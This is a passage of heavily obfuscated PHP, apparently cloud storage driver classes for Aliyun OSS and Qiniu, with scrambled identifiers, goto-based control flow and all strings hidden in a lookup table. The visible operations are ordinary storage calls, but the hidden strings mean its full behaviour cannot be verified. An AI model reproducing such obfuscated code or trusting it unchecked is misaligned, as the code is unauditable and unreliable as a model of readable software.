$eüÆ‹¡ö¢©); } return $cÕéµøÙÌ; } public function has($DÊÉÕ≠ú–Ô, $d–í’¥⁄…Œ = false, $D´≥Ò◊ûàÕ = true) { goto dÌ¿Èèéô÷; cÚˆŸÉ√√Ò: $C·ÌÿÑã≠◊ = $föåÆÖÙéı[33]; $C∂ö ≈‚Îá = 500; $föÚ»∂Ãüı = 0; goto e£∏Éºøπﬂ; e£∏Éºøπﬂ: $bëéê»„“’ = 0; while (!0) { $D·œ¢ŸóΩê = array($föåÆÖÙéı[1184] => $föåÆÖÙéı[8], $föåÆÖÙéı[186] => $e¿‚é¡àëÕ, $föåÆÖÙéı[1185] => $C∂ö ≈‚Îá, $föåÆÖÙéı[1186] => $C·ÌÿÑã≠◊); try { $bÆß™Ûï†û = $this->client->listObjects($this->bucket, $D·œ¢ŸóΩê); } catch (OSS\Core\OssException $AËä›ì£àá) { break; } $C·ÌÿÑã≠◊ = $bÆß™Ûï†û->getNextMarker(); $C◊◊Ç±˘ë∏ = $bÆß™Ûï†û->getObjectList(); $Bï‘ŒÎÃ∞ = $bÆß™Ûï†û->getPrefixList(); if ($d–í’¥⁄…Œ) { if (count($C◊◊Ç±˘ë∏) > 1 || count($C◊◊Ç±˘ë∏) == 1 && $C◊◊Ç±˘ë∏[0]->getKey() != $e¿‚é¡àëÕ) { $föÚ»∂Ãüı += count($C◊◊Ç±˘ë∏) - 1; } if (!empty($Bï‘ŒÎÃ∞)) { $bëéê»„“’ += count($Bï‘ŒÎÃ∞); } if ($C·ÌÿÑã≠◊ === $föåÆÖÙéı[33]) { break; } continue; } if ($D´≥Ò◊ûàÕ) { if (!empty($C◊◊Ç±˘ë∏)) { if (count($C◊◊Ç±˘ë∏) > 1 || $C◊◊Ç±˘ë∏[0]->getKey() != $e¿‚é¡àëÕ) { return !0; } } } else { if (!empty($Bï‘ŒÎÃ∞)) { return !0; } } if ($C·ÌÿÑã≠◊ === $föåÆÖÙéı[33]) { break; } } if ($d–í’¥⁄…Œ) { return array($föåÆÖÙéı[191] => $föÚ»∂Ãüı, $föåÆÖÙéı[192] => $bëéê»„“’); } goto C°¢’ª»”Ò; dÌ¿Èèéô÷: $föåÆÖÙéı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÊÉÕ≠ú–Ô = trim($DÊÉÕ≠ú–Ô, $föåÆÖÙéı[8]); $e¿‚é¡àëÕ = empty($DÊÉÕ≠ú–Ô) ? $föåÆÖÙéı[33] : $DÊÉÕ≠ú–Ô . $föåÆÖÙéı[8]; goto cÚˆŸÉ√√Ò; C°¢’ª»”Ò: return !1; goto EáÖÜ¯ÜÒª; EáÖÜ¯ÜÒª: } public function listAll($BƒΩÏÍâå“) { $CΩÌ‚∏‰¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F∑œ©°…∫ø = $this->fileList($BƒΩÏÍâå“, $CΩÌ‚∏‰¥[33], !0); $d€˜ØÖ≥Áô = array(); foreach ($F∑œ©°…∫ø[$CΩÌ‚∏‰¥[73]] as $E»éÙ¬êØ) { $d€˜ØÖ≥Áô[$E»éÙ¬êØ[$CΩÌ‚∏‰¥[28]]] = $E»éÙ¬êØ[$CΩÌ‚∏‰¥[77]]; } return $this->listAllFiles($BƒΩÏÍâå“, array_keys($d€˜ØÖ≥Áô), $d€˜ØÖ≥Áô); } public function canRead($B©û∞œˆäó) { $cÑ≠·ŸÙ◊† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eÿ—Á¿üç‘ = $this->pathAcl($B©û∞œˆäó); return $Eÿ—Á¿üç‘ == $cÑ≠·ŸÙ◊†[1197] || $Eÿ—Á¿üç‘ == $cÑ≠·ŸÙ◊†[491] ? !0 : !1; } public function canWrite($f≤©‰çﬂË°) { $A‰¥ÍÙùèñ = $this->pathAcl($f≤©‰çﬂË°); return $A‰¥ÍÙùèñ == $_SERVER[Ä¿¡‡öóµŸﬂ‡][491] ? !0 : !1; } public function pathAcl($a˘âÑ‹ùøº) { goto eµ§ƒÒ¶±Á; cŒ≠”©Öç¿: return $dïªÃ‚“á®; goto f√Ü¡∏‹à˘; B±ÁÓØ±√ñ: $dïªÃ‚“á® = $A≤Á¢Ü⁄‘¿ == $FÈéˆó≈¡Â[34] ? $this->bucketAcl : $A≤Á¢Ü⁄‘¿; if ($dïªÃ‚“á® == $FÈéˆó≈¡Â[1198]) { return $FÈéˆó≈¡Â[1197]; } if ($dïªÃ‚“á® == $FÈéˆó≈¡Â[1199]) { return $FÈéˆó≈¡Â[491]; } goto cŒ≠”©Öç¿; eµ§ƒÒ¶±Á: $FÈéˆó≈¡Â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $A≤Á¢Ü⁄‘¿ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($a˘âÑ‹ùøº)); } catch (OSS\Core\OssException $B›œéª†≥) { return !1; } goto B±ÁÓØ±√ñ; f√Ü¡∏‹à˘: } private function chmodPath($Eòﬂô÷ŸÔ≤, $dä≥∂ìŒıÛ = '') { $aœ•ıå»è√ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÏˆÕÉãŒ≥ = empty($dä≥∂ìŒıÛ) ? $aœ•ıå»è√[1199] : $dä≥∂ìŒıÛ; $f‰¡“Çù—  = array($aœ•ıå»è√[34], $aœ•ıå»è√[185], $aœ•ıå»è√[1198], $aœ•ıå»è√[1199]); if (!in_array($fÏˆÕÉãŒ≥, $f‰¡“Çù— )) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Eòﬂô÷ŸÔ≤), $fÏˆÕÉãŒ≥); } catch (OSS\Core\OssException $F¯‘ÚòñÇ ) { return !1; } return !0; } public function getContent($F˜ò¡“ÇŒò) { return $this->fileSubstr($F˜ò¡“ÇŒò, -1); } public function setContent($f»π¡¢Â„Ñ, $FÔ±ù»éãﬂ = '') { $aãüı˜¶”Ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; try { $bßÑ¨óöÓù = $this->trafficLimit($aãüı˜¶”Ç[1200]); $eı”‚ﬂ‹‹ø = $this->client->putObject($this->bucket, $this->pathEncode($f»π¡¢Â„Ñ), $FÔ±ù»éãﬂ, $bßÑ¨óöÓù); } catch (OSS\Core\OssException $d÷∑áéùÑ¯) { return !1; } $fÕàÉ™πï´ = array($aãüı˜¶”Ç[1187] => trim($eı”‚ﬂ‹‹ø[$aãüı˜¶”Ç[1201]], $aãüı˜¶”Ç[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f»π¡¢Â„Ñ))); $this->updateObjMeta($f»π¡¢Â„Ñ, $fÕàÉ™πï´); return isset($eı”‚ﬂ‹‹ø[$aãüı˜¶”Ç[1202]][$aãüı˜¶”Ç[1149]]) ? (int) $eı”‚ﬂ‹‹ø[$aãüı˜¶”Ç[1202]][$aãüı˜¶”Ç[1149]] : strlen($eı”‚ﬂ‹‹ø); } private function updateObjMeta($e±∂œÉöÈè, $còê∞¯çãé) { $e±∂œÉöÈè = $this->pathEncode($e±∂œÉöÈè); try { $Dæº∑∆ÑÑ† = array(OSS\OssClient::OSS_HEADERS => $còê∞¯çãé); $this->client->copyObject($this->bucket, $e±∂œÉöÈè, $this->bucket, $e±∂œÉöÈè, $Dæº∑∆ÑÑ†); } catch (OSS\Core\OssException $Aæ∞å˘âÏã) { return !1; } return !0; } public function upload($e ™∑‰°âÆ, $E·˜ºØ»¯‰, $aöâ°¨Â’Ü = false, $cê∞¡õ—¢ç = REPEAT_REPLACE) { $b–®Ûº‰∞ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÌ≈¬ãÕ˘” = trim($e ™∑‰°âÆ, $b–®Ûº‰∞ô[8]); $cçéó÷ôÂã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($b–®Ûº‰∞ô[1187] => @md5_file($E·˜ºØ»¯‰)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e ™∑‰°âÆ))); $cçéó÷ôÂã = $this->trafficLimit($b–®Ûº‰∞ô[1200], $cçéó÷ôÂã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($CÌ≈¬ãÕ˘”), $E·˜ºØ»¯‰, $cçéó÷ôÂã); } catch (OSS\Core\OssException $DÑ‹ºÓ‰Öπ) { return !1; } return $this->getPathOuter($e ™∑‰°âÆ); } public function getHost() { $DÊÜ€‘•∆É =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D«⁄≈ﬂÁΩü = explode($DÊÜ€‘•∆É[171], parent::getHost()); return $D«⁄≈ﬂÁΩü[0] . $DÊÜ€‘•∆É[171] . $this->bucket . $DÊÜ€‘•∆É[91] . $D«⁄≈ﬂÁΩü[1]; } public function uploadFormData($aã€ëí∆‰«, $bí¥§Œœ¯∑ = 3600) { goto eø÷è¡ÔﬂØ; F©íì®å˘ˆ: return $E‰åÿØÈŒ˘; goto f¢∑êÚÆÉ÷; eø÷è¡ÔﬂØ: $aû·±“Æá“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!($e˘›Ë®òÜ∆ = $this->getHost())) { return !1; } $AñÌØ¢ÃÏ˘ = $bí¥§Œœ¯∑; goto CÕƒ˘Ùﬁ≤◊; CÕƒ˘Ùﬁ≤◊: $a¢ùëæ¬…– = date($aû·±“Æá“[1203], time() + $AñÌØ¢ÃÏ˘); $DÇèŒúåÜò = new DateTime($a¢ùëæ¬…–); $cÆáÑõ¨˜Ç = $DÇèŒúåÜò->format(DateTime::ISO8601); goto Cë©∂âûπ’; aÜ•Â†∫Ìä: $fÀæÉ≠‚¨à = $this->pathFather($aã€ëí∆‰«); $DÓÿƒ ¢◊º = array($aû·±“Æá“[1106] => $cÆáÑõ¨˜Ç, $aû·±“Æá“[1107] => array(array($aû·±“Æá“[1205], 0, $A∏∆…¨Âàû), array($aû·±“Æá“[1110], $aû·±“Æá“[1111], $fÀæÉ≠‚¨à))); $Dã†πÈïäæ = base64_encode(json_encode($DÓÿƒ ¢◊º)); goto Bü›õì¢ıÓ; Bü›õì¢ıÓ: $Dî√œ ≥ æ = base64_encode(hash_hmac($aû·±“Æá“[218], $Dã†πÈïäæ, $this->secret, !0)); $E‰åÿØÈŒ˘ = array($aû·±“Æá“[1116] => $Dã†πÈïäæ, $aû·±“Æá“[1206] => $this->accessKey, $aû·±“Æá“[1112] => $aû·±“Æá“[1104], $aû·±“Æá“[1207] => $Dî√œ ≥ æ, $aû·±“Æá“[169] => $e˘›Ë®òÜ∆); $E‰åÿØÈŒ˘ = $this->trafficLimit($aû·±“Æá“[1200], $E‰åÿØÈŒ˘); goto F©íì®å˘ˆ; Cë©∂âûπ’: $b∏ª«ü›¢å = strpos($cÆáÑõ¨˜Ç, $aû·±“Æá“[284]); $cÆáÑõ¨˜Ç = substr($cÆáÑõ¨˜Ç, 0, $b∏ª«ü›¢å) . $aû·±“Æá“[1204]; $A∏∆…¨Âàû = 1048576000 * 5; goto aÜ•Â†∫Ìä; f¢∑êÚÆÉ÷: } public function multiUploadFormData($D◊°˘Ê≠•∑, $b÷ÓÇ∑›±√ = 3600) { $FíÀÁåæ∫ˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!($F¢ÓœÇ±¶í = $this->getHost())) { return !1; } $BáÍáÜè¬Ó = $this->trafficLimit($FíÀÁåæ∫ˆ[1200]); $aÚ·£èüÉÚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D◊°˘Ê≠•∑), $BáÍáÜè¬Ó); return array($FíÀÁåæ∫ˆ[209] => $aÚ·£èüÉÚ, $FíÀÁåæ∫ˆ[169] => $F¢ÓœÇ±¶í . $FíÀÁåæ∫ˆ[8] . $this->pathEncode($D◊°˘Ê≠•∑), $FíÀÁåæ∫ˆ[210] => gmdate($FíÀÁåæ∫ˆ[1208]), $FíÀÁåæ∫ˆ[89] => $D◊°˘Ê≠•∑); } public function multiUploadAuthData($cø⁄Üíºõà, $e§Øƒì®ÌÖ = array()) { goto F”¿À å¶◊; fÌÑ—è¡œ˘: $dö…Úà±ñ€ = $eŸﬂﬁòò•◊[1211] . $this->accessKey . $eŸﬂﬁòò•◊[4] . $BøﬂôÇç∏Ó; if (strpos($BåäÁìÊ–Õ, $eŸﬂﬁòò•◊[213]) === 0) { $dö…Úà±ñ€ = array($eŸﬂﬁòò•◊[220] => $dö…Úà±ñ€, $eŸﬂﬁòò•◊[210] => $E€õáÚ⁄Éì); if ($BçÌ∏—…¬¨) { $dö…Úà±ñ€ = array_merge($dö…Úà±ñ€, $BçÌ∏—…¬¨); } } return $dö…Úà±ñ€; goto c„•π¿ê∞ô; a◊Ì‰≥á®: if (!empty($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[1210]])) { $aè≈®è⁄õ≤ = array_merge(array($B—‰ﬂñéﬂƒ[4]), $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[1210]]); sort($aè≈®è⁄õ≤); $B—‰ﬂñéﬂƒ[4] = implode($eŸﬂﬁòò•◊[217], $aè≈®è⁄õ≤); } $e»åÌ∞ ‚∫ = implode($eŸﬂﬁòò•◊[217], $B—‰ﬂñéﬂƒ); $BøﬂôÇç∏Ó = base64_encode(hash_hmac($eŸﬂﬁòò•◊[218], $e»åÌ∞ ‚∫, $this->secret, !0)); goto fÌÑ—è¡œ˘; c∫¶íŸèçÇ: $B—‰ﬂñéﬂƒ = array($eŸﬂﬁòò•◊[212], $eŸﬂﬁòò•◊[33], $eŸﬂﬁòò•◊[116], $E€õáÚ⁄Éì, "\x78\x2d\157\163\163\55\144\x61\164\x65\72{$E€õáÚ⁄Éì}", $eŸﬂﬁòò•◊[8] . $this->bucket . $eŸﬂﬁòò•◊[8] . $c≥˜ﬂÒäô‰ . $BåäÁìÊ–Õ); if (strpos($BåäÁìÊ–Õ, $eŸﬂﬁòò•◊[213]) === 0) { $B—‰ﬂñéﬂƒ[0] = $eŸﬂﬁòò•◊[214]; if ($BçÌ∏—…¬¨ = $this->trafficLimit($eŸﬂﬁòò•◊[1200])) { $c≥˜ﬂÒäô‰ = $eŸﬂﬁòò•◊[1209]; array_splice($B—‰ﬂñéﬂƒ, 5, 0, $c≥˜ﬂÒäô‰ . $eŸﬂﬁòò•◊[4] . $BçÌ∏—…¬¨[$c≥˜ﬂÒäô‰]); } } if (isset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[215]]) && $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[215]] == $eŸﬂﬁòò•◊[216]) { $B—‰ﬂñéﬂƒ[0] = $eŸﬂﬁòò•◊[216]; } goto a◊Ì‰≥á®; aèááÍπÃÌ: $c≥˜ﬂÒäô‰ = $cø⁄Üíºõà; if (isset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[89]])) { $c≥˜ﬂÒäô‰ = $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[89]]; unset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[89]]); } if (isset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[211]])) { $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[210]] = $E€õáÚ⁄Éì; return $this->listUploadParts($c≥˜ﬂÒäô‰, $e§Øƒì®ÌÖ); } goto c∫¶íŸèçÇ; F”¿À å¶◊: $eŸﬂﬁòò•◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E€õáÚ⁄Éì = isset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[210]]) ? $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[210]] : gmdate($eŸﬂﬁòò•◊[1208]); $BåäÁìÊ–Õ = isset($e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[160]]) ? $e§Øƒì®ÌÖ[$eŸﬂﬁòò•◊[160]] : $eŸﬂﬁòò•◊[33]; goto aèááÍπÃÌ; c„•π¿ê∞ô: } public function listUploadParts($F√›†îÉûŒ, $c¡◊Èõù∑™) { goto bñπ∫™«ù∂; F¬á”Áêºñ: return array($f≥ƒòº¿ÑÓ[220] => $c¨Òﬁê‰∆¢, $f≥ƒòº¿ÑÓ[210] => $c¡◊Èõù∑™[$f≥ƒòº¿ÑÓ[210]], $f≥ƒòº¿ÑÓ[222] => $eÃÆ£ÆÖÛë); goto Dó®Œµ†üÉ; C∂Î‡ÜÀÖª: unset($c¡◊Èõù∑™[$f≥ƒòº¿ÑÓ[211]], $c¡◊Èõù∑™[$f≥ƒòº¿ÑÓ[215]]); $c¨Òﬁê‰∆¢ = $this->multiUploadAuthData($F√›†îÉûŒ, $c¡◊Èõù∑™); if (empty($c¨Òﬁê‰∆¢)) { return !1; } goto F¬á”Áêºñ; b›ÀÈ˜êêÂ: $D†‰€ıìí√ = $eÔ◊âÇà≈€->getListPart(); $eÃÆ£ÆÖÛë = array(); foreach ($D†‰€ıìí√ as $cÔã¢∂ÎÚí) { $eÃÆ£ÆÖÛë[] = array($f≥ƒòº¿ÑÓ[1191] => $cÔã¢∂ÎÚí->getPartNumber(), $f≥ƒòº¿ÑÓ[1192] => trim($cÔã¢∂ÎÚí->getETag(), $f≥ƒòº¿ÑÓ[113])); } goto C∂Î‡ÜÀÖª; bñπ∫™«ù∂: $f≥ƒòº¿ÑÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a£˘”çÆáÃ = parse_url_query($c¡◊Èõù∑™[$f≥ƒòº¿ÑÓ[160]]); $eÔ◊âÇà≈€ = $this->client->listParts($this->bucket, $this->pathEncode($F√›†îÉûŒ), $a£˘”çÆáÃ[$f≥ƒòº¿ÑÓ[209]]); goto b›ÀÈ˜êêÂ; Dó®Œµ†üÉ: } public function download($DÀÜ§Ÿ´ﬁ“, $eåä·ÿΩ‰™) { if ($this->isFolder($DÀÜ§Ÿ´ﬁ“)) { return !1; } try { $AÊÏÁ’§≤‘ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $eåä·ÿΩ‰™); $AÊÏÁ’§≤‘ = $this->trafficLimit($_SERVER[Ä¿¡‡öóµŸﬂ‡][105], $AÊÏÁ’§≤‘); $this->client->getObject($this->bucket, $this->pathEncode($DÀÜ§Ÿ´ﬁ“), $AÊÏÁ’§≤‘); } catch (OSS\Core\OssException $döÇöì—Ç·) { return !1; } return $eåä·ÿΩ‰™; } public function fileSubstr($CÊıﬁöıÔï, $aÜ≤÷ê äè = 0, $c∏π€·ªÑà = false) { if ($aÜ≤÷ê äè === -1) { $D…‘“√◊ΩÙ = array(); } else { if ($c∏π€·ªÑà === !1) { $BÈ Í’ÿ‰¶ = $this->size($CÊıﬁöıÔï); } else { $BÈ Í’ÿ‰¶ = $aÜ≤÷ê äè + $c∏π€·ªÑà - 1; } $D…‘“√◊ΩÙ = array(OSS\OssClient::OSS_RANGE => "{$aÜ≤÷ê äè}\x2d{$BÈ Í’ÿ‰¶}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CÊıﬁöıÔï), $D…‘“√◊ΩÙ); } catch (OSS\Core\OssException $c›°Æç¿Æà) { think_exception($c›°Æç¿Æà->getMessage()); return !1; } } private function trafficLimit($câô¯†Ω∫ü, $bÍÕåÑ‹ñâ = array()) { goto Dƒ∆âõ©ø˜; A üµëéàÓ: return $bÍÕåÑ‹ñâ; goto D—Ü∆π◊åû; c‡ù√ä∆îÀ: if (!$bËπ‹ÑáÎ) { return $bÍÕåÑ‹ñâ; } $bËπ‹ÑáÎ = $bËπ‹ÑáÎ < 819200 ? 819200 : ($bËπ‹ÑáÎ > 838860800 ? 838860800 : $bËπ‹ÑáÎ); $bÍÕåÑ‹ñâ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($bËπ‹ÑáÎ); goto A üµëéàÓ; Dƒ∆âõ©ø˜: $eïÖõÓÃÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($câô¯†Ω∫ü == $eïÖõÓÃÖ[1200] && $this->isUploadServer() || $câô¯†Ω∫ü == $eïÖõÓÃÖ[105] && $this->isFileOutServer()) { return $bÍÕåÑ‹ñâ; } $bËπ‹ÑáÎ = floatval($GLOBALS[$eïÖõÓÃÖ[6]][$eïÖõÓÃÖ[84]][$eïÖõÓÃÖ[103]][$câô¯†Ω∫ü]) * 1024 * 1024 * 8; goto c‡ù√ä∆îÀ; D—Ü∆π◊åû: } public function link($fÊª∞≥Õñ®, $a•≤©‚ø±Â = array()) { $bç¡–•º–Ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->exist($fÊª∞≥Õñ®) || $this->isFolder($fÊª∞≥Õñ®)) { return !1; } try { $a•≤©‚ø±Â = $this->trafficLimit($bç¡–•º–Ã[105], $a•≤©‚ø±Â); $cìÑ…¥‹–å = $this->client->signUrl($this->bucket, $this->pathEncode($fÊª∞≥Õñ®), 3600 * 12, $bç¡–•º–Ã[216], $a•≤©‚ø±Â); return $this->getCdnLink($cìÑ…¥‹–å); } catch (OSS\Core\OssException $E´èåéÖ Ü) { return !1; } } public function fileOut($aâá¶ñıÕó, $EÒœªà¯‡è = false, $C§É≥¯â›© = false, $e¯¬ŒıéÉﬁ = '') { goto Cùú©≥Âä·; fÉÏ∫◊ˆÛ: $this->fileOutLink($fÉ™˜¿ÖóÙ); goto f¯ö·‡åæ; D‘èã»†ºç: $DúÃÖ—±Ì‹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $f±Æä·Òîœ[1212] . rawurlencode("{$EÒœªà¯‡è}\73\146\151\x6c\145\x6e\x61\155\145\75{$C§É≥¯â›©}")); $DúÃÖ—±Ì‹[OSS\OssClient::OSS_SUB_RESOURCE] .= $f±Æä·Òîœ[1213] . rawurlencode($e¨°ÑÇöÂ–); $fÉ™˜¿ÖóÙ = $this->link($aâá¶ñıÕó, $DúÃÖ—±Ì‹); goto fÉÏ∫◊ˆÛ; AÉΩÃò◊ª˜: $e¨°ÑÇöÂ– = get_file_mime(get_path_ext($C§É≥¯â›©)); if ($e¨°ÑÇöÂ– == $f±Æä·Òîœ[201]) { return parent::fileOut($aâá¶ñıÕó, $EÒœªà¯‡è, $C§É≥¯â›©, $e¯¬ŒıéÉﬁ); } $EÒœªà¯‡è = $EÒœªà¯‡è ? $f±Æä·Òîœ[202] : $f±Æä·Òîœ[203]; goto D‘èã»†ºç; Cùú©≥Âä·: $f±Æä·Òîœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$C§É≥¯â›©) { $C§É≥¯â›© = $this->pathThis($aâá¶ñıÕó); } $C§É≥¯â›© = rawurlencode($C§É≥¯â›©); goto AÉΩÃò◊ª˜; f¯ö·‡åæ: } public function fileOutServer($aà–œ£¯œõ, $bı‚îœÈ—É = false, $EìáÖ≥ˆÚç = false, $cãéŒÖØ∑‰ = '') { parent::fileOut($aà–œ£¯œõ, $bı‚îœÈ—É, $EìáÖ≥ˆÚç, $cãéŒÖØ∑‰); } public function fileOutImage($b¯ÕÓ£í∫Ë, $DÖñÃµì≠û = 250) { $EÑ÷Ë·Ç¡¬ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ä¿¡‡öóµŸﬂ‡][1214] . $DÖñÃµì≠û); $cí•ÇøÃ˜± = $this->link($b¯ÕÓ£í∫Ë, $EÑ÷Ë·Ç¡¬); $this->fileOutLink($cí•ÇøÃ˜±); } public function fileOutImageServer($BÒÖæ˜Üãå, $A…‚∂‹ÖõÒ = 250) { parent::fileOutImage($BÒÖæ˜Üãå, $A…‚∂‹ÖõÒ); } public function fileOutLink($bΩËπ¿ïæ‹) { $D‚∆¬«∞ÂÏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->isCdnHost() && substr($bΩËπ¿ïæ‹, 0, 7) == $D‚∆¬«∞ÂÏ[1119]) { $bΩËπ¿ïæ‹ = $D‚∆¬«∞ÂÏ[1120] . substr($bΩËπ¿ïæ‹, 7); } header($D‚∆¬«∞ÂÏ[156] . $bΩËπ¿ïæ‹); die; } public function hashMd5($cÑˆÿØˆ¿å, $aã˘Ω±Éñﬁ = '') { $AÏ∏í™‡•Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eê±û∞»≥ü = $this->objectMeta($cÑˆÿØˆ¿å); if (!$Eê±û∞»≥ü) { return $AÏ∏í™‡•Ö[33]; } if (!isset($Eê±û∞»≥ü[$AÏ∏í™‡•Ö[1187]]) && !empty($aã˘Ω±Éñﬁ)) { $Bìô¢≤åë« = $this->updateObjMeta($cÑˆÿØˆ¿å, array($AÏ∏í™‡•Ö[1187] => $aã˘Ω±Éñﬁ)); $Eê±û∞»≥ü[$AÏ∏í™‡•Ö[1187]] = $Bìô¢≤åë« ? $aã˘Ω±Éñﬁ : $AÏ∏í™‡•Ö[33]; } return isset($Eê±û∞»≥ü[$AÏ∏í™‡•Ö[1187]]) ? strtolower($Eê±û∞»≥ü[$AÏ∏í™‡•Ö[1187]]) : $AÏ∏í™‡•Ö[33]; } public function size($E¨»êïàÜ®) { $c¿»Ê“üπ = $this->objectMeta($E¨»êïàÜ®); return $c¿»Ê“üπ ? $c¿»Ê“üπ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function info($BÚ˜ô§ë±Ñ) { if ($this->isFolder($BÚ˜ô§ë±Ñ)) { return $this->folderInfo($BÚ˜ô§ë±Ñ); } else { if ($this->isFile($BÚ˜ô§ë±Ñ)) { return $this->fileInfo($BÚ˜ô§ë±Ñ); } } return !1; } public function exist($dÈ—‚öœ¿Ñ) { return $this->isFile($dÈ—‚öœ¿Ñ) || $this->isFolder($dÈ—‚öœ¿Ñ); } public function isFile($Bó⁄ﬂ‹á∏ ) { return !$this->isFolder($Bó⁄ﬂ‹á∏ ) && $this->objectMeta($Bó⁄ﬂ‹á∏ ); } public function isFolder($f˜íÒè–©ˆ) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][223], $f˜íÒè–©ˆ); } protected function objectMeta($d÷ﬁûçÑÂ≥) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][224], $d÷ﬁûçÑÂ≥); } protected function _objectMeta($cÍ¶◊èùÔº) { $AôÉµñ™™ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; try { $e≥°„«≠ﬂÛ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cÍ¶◊èùÔº)); } catch (OSS\Core\OssException $D£“ﬁöÏÉ¡) { $e≥°„«≠ﬂÛ = !1; } if ($e≥°„«≠ﬂÛ) { $e≥°„«≠ﬂÛ[$AôÉµñ™™[77]] = intval($e≥°„«≠ﬂÛ[$AôÉµñ™™[1194]]); } return $e≥°„«≠ﬂÛ; } protected function _isFolder($bπâ–ÛËû÷) { $bë¢…´ íÃ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($bπâ–ÛËû÷ == $bë¢…´ íÃ[33] || $bπâ–ÛËû÷ == $bë¢…´ íÃ[8]) { return !0; } $CŸè≈‹¿†˘ = array($bë¢…´ íÃ[1184] => $bë¢…´ íÃ[8], $bë¢…´ íÃ[186] => rtrim($bπâ–ÛËû÷, $bë¢…´ íÃ[8]) . $bë¢…´ íÃ[8], $bë¢…´ íÃ[1185] => 1, $bë¢…´ íÃ[1186] => $bë¢…´ íÃ[33]); $D≤¡›Ì†—∂ = $this->client->listObjects($this->bucket, $CŸè≈‹¿†˘); if ($D≤¡›Ì†—∂->getObjectList() || $D≤¡›Ì†—∂->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fèéÃÃàΩ˜) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ä¿¡‡öóµŸﬂ‡][1215]; $this->_init($fèéÃÃàΩ˜); } public function _init($D…÷ŸπÈ°«) { foreach ($D…÷ŸπÈ°« as $a–Â–ö“ç‚ => $EÁ¥à≤ı¿Û) { if (isset($this->{$a–Â–ö“ç‚})) { $this->{$a–Â–ö“ç‚} = $EÁ¥à≤ı¿Û; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ä¿¡‡öóµŸﬂ‡][1216], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Eù—∂’˘Ô—, $e‰Ã®Àí¡ª = '', $CæËÍΩêç€ = REPEAT_RENAME) { if ($this->setContent($Eù—∂’˘Ô—, $e‰Ã®Àí¡ª)) { return $this->getPathOuter($Eù—∂’˘Ô—); } return !1; } public function mkdir($Eó„ÇçﬁÆº, $dÇ†”√†ë• = REPEAT_SKIP) { goto EÍ≈÷èıáı; bÎÈ«òÕãπ: $Eó„ÇçﬁÆº = $d™¡Ñ÷â∏ . $CÑØæ€ñ´º[8]; $E•»î´Õ≈á = get_path_this($d™¡Ñ÷â∏); $Aá‹«Ööùí = $Eó„ÇçﬁÆº . $E•»î´Õ≈á; goto fÉ„÷ïì÷Ì; fÉ„÷ïì÷Ì: if (!$this->mkfile($Aá‹«Ööùí)) { return !1; } if (!$this->moveFile($Aá‹«Ööùí, $Eó„ÇçﬁÆº)) { $this->delFile($Aá‹«Ööùí); return !1; } return 